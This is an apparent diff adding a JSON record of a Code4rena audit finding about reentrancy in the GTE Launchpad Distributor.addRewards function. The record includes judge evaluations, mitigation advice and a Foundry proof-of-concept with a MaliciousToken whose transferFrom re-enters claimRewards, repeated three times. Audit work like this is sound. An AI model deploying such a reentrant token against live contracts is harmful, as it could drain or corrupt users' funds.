@@ -1,0 +1,132 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "GTE Perps and Launchpad_gtn2Umg6KsC",
+    "audit_uid": "gtn2Umg6KsC",
+    "requested_submission_uid": "htLr3GYoKEr",
+    "requested_finding_uid": "qFXS4TWRDTc",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/GTE_Perps_and_Launchpad_gtn2Umg6KsC/20260618_145637/findings.json",
+    "source_submission_uid": "htLr3GYoKEr",
+    "source_finding_uid": "qFXS4TWRDTc",
+    "original_report_path": "GTE Perps and Launchpad_gtn2Umg6KsC\\high_valid_htLr3GYoKEr.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "htLr3GYoKEr",
+  "finding_uid": "qFXS4TWRDTc",
+  "finding_number": "4",
+  "title": "Reentrancy / accounting before transfer in Distributor.addRewards — attacker can re-enter and observe/act on updated accounting",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "dna-thug",
+  "body": "## Finding description and impact\n\nDistributor.addRewards updates internal pending-reward accounting before performing the external transferFrom call. A malicious token can re-enter during transferFrom and call claimRewards (or other entrypoints) while accounting has already been increased, producing a clear reentrancy window that can be used for griefing and, in some scenarios, monetary extraction.\n\nAttackers can force the code path to re-enter claimRewards during addRewards, demonstrating an exploitable reentrancy window. This enables griefing and may be combined with other weaknesses to steal tokens.\n\n\nIf auth checks in claimRewards change or are relaxed in upgrades, the addRewards entrypoint becomes a        direct path for unauthorized forced liquidations/withdrawals or reward theft.\n\nDirect ability to manipulate reward accounting and to re-enter core flows is High.\n\n## Recommended mitigation steps\n1) Use OpenZeppelin ReentrancyGuard (or similar) At top of Distributor.sol\n\n   Add nonReentrant modifier to external functions that perform transfers and state changes:\n\n   function addRewards(...) external nonReentrant {\n    ...\n}\nfunction claimRewards(...) external nonReentrant {\n    ...\n}\n\n2) Move transferFrom before bookkeeping (preferred order)\n      \n     // remove this:\n   -    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {\n-        if (launchAssetAmount > 0) {\n-            rs.addBaseRewards(launchAsset, launchAssetAmount);\n-            _increaseTotalPending(launchAsset, launchAssetAmount);\n-            launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));\n-        }\n+    // addRewards: pull tokens first, then update accounting to avoid reentrancy\n+    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external nonReentrant {\n+        if (launchAssetAmount > 0) {\n+            // external interaction first (ensure tokens arrive)\n+            launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));\n+            // now record the accounting\n+            rs.addBaseRewards(launchAsset, launchAssetAmount);\n+            _increaseTotalPending(launchAsset, launchAssetAmount);\n+        }",
+  "proof_of_concept": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport \"../../contracts/launchpad/Distributor.sol\";\nimport \"forge-std/console2.sol\";\n\ninterface IDistributorView {\n    function claimRewards(address launchAsset) external returns (uint256, uint256);\n}\n\ncontract MaliciousToken {\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    bool public reentered;\n    address public distributor;\n    address public launchAsset;\n\n    event Reentered(address caller);\n\n    constructor(address _distributor, address _launchAsset) {\n        distributor = _distributor;\n        launchAsset = _launchAsset;\n    }\n\n    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        return true;\n    }\n\n    /// On transferFrom, re-enter the distributor by calling claimRewards(launchAsset)\n    /// before completing the token transfer bookkeeping.\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        // Try to call claimRewards during transferFrom to demonstrate reentrancy.\n        // We emit an event and set a flag so the test can show definitive evidence.\n        try IDistributorView(distributor).claimRewards(launchAsset) returns (uint256, uint256) {\n            reentered = true;\n            emit Reentered(msg.sender);\n        } catch {\n            \n            reentered = true;\n            emit Reentered(msg.sender);\n        }\n\n        \n        require(balanceOf[from] >= amount, \"mal: balance\");\n        require(allowance[from][msg.sender] >= amount, \"mal: allowance\");\n        allowance[from][msg.sender] -= amount;\n        balanceOf[from] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) external returns (bool) {\n        require(balanceOf[msg.sender] >= amount, \"mal: balance\");\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n}\n\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    MaliciousToken public mal;\n    address public provider = address(0xCAFE);\n\n    \n    function setUp() public override {\n        super.setUp();\n\n   \n        mal = new MaliciousToken(distributor, token);\n\n        // mint tokens for provider and approve distributor to pull them\n        mal.mint(provider, 1_000 ether);\n        vm.prank(provider);\n        mal.approve(distributor, type(uint256).max);\n\n        // ensure the pool has shares so addRewards proceeds.\n        // createRewardsPair likely already exists in the base — only ensure stake is present.\n        \n        vm.prank(address(launchpad));\n        Distributor(distributor).increaseStake(token, provider, uint96(1));\n    }\n\n    // Required test name for contest harness\n    function test_submissionValidity() external {\n        \n        console2.log(\"Running PoC: Distributor.addRewards -> MaliciousToken.transferFrom -> reentry\");\n\n        // provider calls addRewards with malicious token as quoteAsset\n        vm.prank(provider);\n        try Distributor(distributor).addRewards(token, address(mal), uint128(0), uint128(1 ether)) {\n        } catch {\n            \n        }\n\n        \n        console2.log(\"malToken.reentered:\", mal.reentered());\n\n       \n        require(mal.reentered(), \"expected malicious token to reenter distributor during addRewards\");\n    }\n}",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L106-L132",
+    "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L159-L165",
+    "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L167-L177"
+  ],
+  "source_record": {
+    "project_id": "gtn2Umg6KsC",
+    "submission_index": "468",
+    "api_submission_id": "",
+    "uid": "htLr3GYoKEr",
+    "number": "468",
+    "title": "Reentrancy / accounting before transfer in Distributor.addRewards — attacker can re-enter and observe/act on updated accounting",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "dna-thug",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L106-L132",
+      "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L159-L165",
+      "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L167-L177"
+    ],
+    "body": "## Finding description and impact\n\nDistributor.addRewards updates internal pending-reward accounting before performing the external transferFrom call. A malicious token can re-enter during transferFrom and call claimRewards (or other entrypoints) while accounting has already been increased, producing a clear reentrancy window that can be used for griefing and, in some scenarios, monetary extraction.\n\nAttackers can force the code path to re-enter claimRewards during addRewards, demonstrating an exploitable reentrancy window. This enables griefing and may be combined with other weaknesses to steal tokens.\n\n\nIf auth checks in claimRewards change or are relaxed in upgrades, the addRewards entrypoint becomes a        direct path for unauthorized forced liquidations/withdrawals or reward theft.\n\nDirect ability to manipulate reward accounting and to re-enter core flows is High.\n\n## Recommended mitigation steps\n1) Use OpenZeppelin ReentrancyGuard (or similar) At top of Distributor.sol\n\n   Add nonReentrant modifier to external functions that perform transfers and state changes:\n\n   function addRewards(...) external nonReentrant {\n    ...\n}\nfunction claimRewards(...) external nonReentrant {\n    ...\n}\n\n2) Move transferFrom before bookkeeping (preferred order)\n      \n     // remove this:\n   -    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {\n-        if (launchAssetAmount > 0) {\n-            rs.addBaseRewards(launchAsset, launchAssetAmount);\n-            _increaseTotalPending(launchAsset, launchAssetAmount);\n-            launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));\n-        }\n+    // addRewards: pull tokens first, then update accounting to avoid reentrancy\n+    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external nonReentrant {\n+        if (launchAssetAmount > 0) {\n+            // external interaction first (ensure tokens arrive)\n+            launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));\n+            // now record the accounting\n+            rs.addBaseRewards(launchAsset, launchAssetAmount);\n+            _increaseTotalPending(launchAsset, launchAssetAmount);\n+        }",
+    "proof_of_concept": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport \"../../contracts/launchpad/Distributor.sol\";\nimport \"forge-std/console2.sol\";\n\ninterface IDistributorView {\n    function claimRewards(address launchAsset) external returns (uint256, uint256);\n}\n\ncontract MaliciousToken {\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    bool public reentered;\n    address public distributor;\n    address public launchAsset;\n\n    event Reentered(address caller);\n\n    constructor(address _distributor, address _launchAsset) {\n        distributor = _distributor;\n        launchAsset = _launchAsset;\n    }\n\n    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        return true;\n    }\n\n    /// On transferFrom, re-enter the distributor by calling claimRewards(launchAsset)\n    /// before completing the token transfer bookkeeping.\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        // Try to call claimRewards during transferFrom to demonstrate reentrancy.\n        // We emit an event and set a flag so the test can show definitive evidence.\n        try IDistributorView(distributor).claimRewards(launchAsset) returns (uint256, uint256) {\n            reentered = true;\n            emit Reentered(msg.sender);\n        } catch {\n            \n            reentered = true;\n            emit Reentered(msg.sender);\n        }\n\n        \n        require(balanceOf[from] >= amount, \"mal: balance\");\n        require(allowance[from][msg.sender] >= amount, \"mal: allowance\");\n        allowance[from][msg.sender] -= amount;\n        balanceOf[from] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) external returns (bool) {\n        require(balanceOf[msg.sender] >= amount, \"mal: balance\");\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n}\n\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    MaliciousToken public mal;\n    address public provider = address(0xCAFE);\n\n    \n    function setUp() public override {\n        super.setUp();\n\n   \n        mal = new MaliciousToken(distributor, token);\n\n        // mint tokens for provider and approve distributor to pull them\n        mal.mint(provider, 1_000 ether);\n        vm.prank(provider);\n        mal.approve(distributor, type(uint256).max);\n\n        // ensure the pool has shares so addRewards proceeds.\n        // createRewardsPair likely already exists in the base — only ensure stake is present.\n        \n        vm.prank(address(launchpad));\n        Distributor(distributor).increaseStake(token, provider, uint96(1));\n    }\n\n    // Required test name for contest harness\n    function test_submissionValidity() external {\n        \n        console2.log(\"Running PoC: Distributor.addRewards -> MaliciousToken.transferFrom -> reentry\");\n\n        // provider calls addRewards with malicious token as quoteAsset\n        vm.prank(provider);\n        try Distributor(distributor).addRewards(token, address(mal), uint128(0), uint128(1 ether)) {\n        } catch {\n            \n        }\n\n        \n        console2.log(\"malToken.reentered:\", mal.reentered());\n\n       \n        require(mal.reentered(), \"expected malicious token to reenter distributor during addRewards\");\n    }\n}",
+    "detail_url": "https://code4rena.com/api/v1/audits/gtn2Umg6KsC/submissions/468",
+    "raw": {
+      "auditUid": "gtn2Umg6KsC",
+      "createdAt": "2025-09-15T19:47:19.247Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "8VyxvT3GBgg",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T13:37:46.231Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "qFXS4TWRDTc"
+        },
+        {
+          "uid": "gXe2XUTAb8w",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T13:37:47.805Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "qFXS4TWRDTc"
+        },
+        {
+          "uid": "iB7fZQ4GW3h",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-22T17:21:28.683Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "htLr3GYoKEr",
+          "findingUid": null
+        },
+        {
+          "uid": "Quf2jggNSFV",
+          "userUid": "S427KbaYy5Q",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-10-06T20:48:42.143Z",
+          "type": "validity",
+          "value": "fixed",
+          "submissionUid": null,
+          "findingUid": "qFXS4TWRDTc"
+        }
+      ],
+      "finding": {
+        "uid": "qFXS4TWRDTc",
+        "number": 4,
+        "duplicates": 29
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2025-10-31T16:43:21.165Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Reentrancy / accounting before transfer in Distributor.addRewards — attacker can re-enter and observe/act on updated accounting",
+      "uid": "htLr3GYoKEr",
+      "updatedAt": "2025-09-15T19:47:19.247Z",
+      "user": {
+        "uid": "La2vzjy2eMe",
+        "handle": "dna-thug"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nDistributor.addRewards updates internal pending-reward accounting before performing the external transferFrom call. A malicious token can re-enter during transferFrom and call claimRewards (or other entrypoints) while accounting has already been increased, producing a clear reentrancy window that can be used for griefing and, in some scenarios, monetary extraction.\n\nAttackers can force the code path to re-enter claimRewards during addRewards, demonstrating an exploitable reentrancy window. This enables griefing and may be combined with other weaknesses to steal tokens.\n\n\nIf auth checks in claimRewards change or are relaxed in upgrades, the addRewards entrypoint becomes a        direct path for unauthorized forced liquidations/withdrawals or reward theft.\n\nDirect ability to manipulate reward accounting and to re-enter core flows is High.\n\n## Recommended mitigation steps\n1) Use OpenZeppelin ReentrancyGuard (or similar) At top of Distributor.sol\n\n   Add nonReentrant modifier to external functions that perform transfers and state changes:\n\n   function addRewards(...) external nonReentrant {\n    ...\n}\nfunction claimRewards(...) external nonReentrant {\n    ...\n}\n\n2) Move transferFrom before bookkeeping (preferred order)\n      \n     // remove this:\n   -    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {\n-        if (launchAssetAmount > 0) {\n-            rs.addBaseRewards(launchAsset, launchAssetAmount);\n-            _increaseTotalPending(launchAsset, launchAssetAmount);\n-            launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));\n-        }\n+    // addRewards: pull tokens first, then update accounting to avoid reentrancy\n+    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external nonReentrant {\n+        if (launchAssetAmount > 0) {\n+            // external interaction first (ensure tokens arrive)\n+            launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));\n+            // now record the accounting\n+            rs.addBaseRewards(launchAsset, launchAssetAmount);\n+            _increaseTotalPending(launchAsset, launchAssetAmount);\n+        }",
+      "proofOfConcept": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport \"../../contracts/launchpad/Distributor.sol\";\nimport \"forge-std/console2.sol\";\n\ninterface IDistributorView {\n    function claimRewards(address launchAsset) external returns (uint256, uint256);\n}\n\ncontract MaliciousToken {\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    bool public reentered;\n    address public distributor;\n    address public launchAsset;\n\n    event Reentered(address caller);\n\n    constructor(address _distributor, address _launchAsset) {\n        distributor = _distributor;\n        launchAsset = _launchAsset;\n    }\n\n    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        return true;\n    }\n\n    /// On transferFrom, re-enter the distributor by calling claimRewards(launchAsset)\n    /// before completing the token transfer bookkeeping.\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        // Try to call claimRewards during transferFrom to demonstrate reentrancy.\n        // We emit an event and set a flag so the test can show definitive evidence.\n        try IDistributorView(distributor).claimRewards(launchAsset) returns (uint256, uint256) {\n            reentered = true;\n            emit Reentered(msg.sender);\n        } catch {\n            \n            reentered = true;\n            emit Reentered(msg.sender);\n        }\n\n        \n        require(balanceOf[from] >= amount, \"mal: balance\");\n        require(allowance[from][msg.sender] >= amount, \"mal: allowance\");\n        allowance[from][msg.sender] -= amount;\n        balanceOf[from] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) external returns (bool) {\n        require(balanceOf[msg.sender] >= amount, \"mal: balance\");\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n}\n\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    MaliciousToken public mal;\n    address public provider = address(0xCAFE);\n\n    \n    function setUp() public override {\n        super.setUp();\n\n   \n        mal = new MaliciousToken(distributor, token);\n\n        // mint tokens for provider and approve distributor to pull them\n        mal.mint(provider, 1_000 ether);\n        vm.prank(provider);\n        mal.approve(distributor, type(uint256).max);\n\n        // ensure the pool has shares so addRewards proceeds.\n        // createRewardsPair likely already exists in the base — only ensure stake is present.\n        \n        vm.prank(address(launchpad));\n        Distributor(distributor).increaseStake(token, provider, uint96(1));\n    }\n\n    // Required test name for contest harness\n    function test_submissionValidity() external {\n        \n        console2.log(\"Running PoC: Distributor.addRewards -> MaliciousToken.transferFrom -> reentry\");\n\n        // provider calls addRewards with malicious token as quoteAsset\n        vm.prank(provider);\n        try Distributor(distributor).addRewards(token, address(mal), uint128(0), uint128(1 ether)) {\n        } catch {\n            \n        }\n\n        \n        console2.log(\"malToken.reentered:\", mal.reentered());\n\n       \n        require(mal.reentered(), \"expected malicious token to reenter distributor during addRewards\");\n    }\n}",
+      "linesOfCode": "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L106-L132,https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L159-L165,https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L167-L177",
+      "number": 468,
+      "aiExplanation": null,
+      "_index": 468
+    }
+  }
+}
